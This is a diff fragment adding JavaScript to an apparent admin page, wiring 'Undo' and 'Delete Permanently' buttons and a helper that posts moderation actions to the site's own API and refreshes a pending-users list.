+      const res = await fetch('/api/admin/undo/' + s.id, { method: 'POST' });
+      if (res.ok) {
+        li.remove(); 
+      } else {
+        const err = await res.json();
+        alert('Error: ' + err.error);
+      }
+    };
+    
+    const permDeleteBtn = document.createElement('button');
+    permDeleteBtn.className = 'act delete';
+    permDeleteBtn.textContent = 'Delete Permanently';
+    permDeleteBtn.onclick = async () => {
+      if (!confirm('Are you sure you want to permanently delete this user? This cannot be undone.')) return;
+      li.remove();
+      await fetch('/api/admin/permanent-delete/' + s.id, { method: 'DELETE' });
+    };
+    
+    btnContainer.appendChild(undoBtn);
+    btnContainer.appendChild(permDeleteBtn);
+    li.appendChild(btnContainer);
+    
+    list.appendChild(li);
+  }
+}
+
+async function doAction(action, id) {
+  const r = await fetch('/api/admin/' + action + '/' + id, { method: 'POST' });
+  if (!r.ok) return alert('Could not update');
+  
+  // Update the memory silently before fetching
+  const updated = await fetch('/api/admin/pending').then(res => res.json());
+  lastKnownIds = updated.map(x => x.id);
+  renderTable(updated);
+}
+</script>
+</body>
+</html>
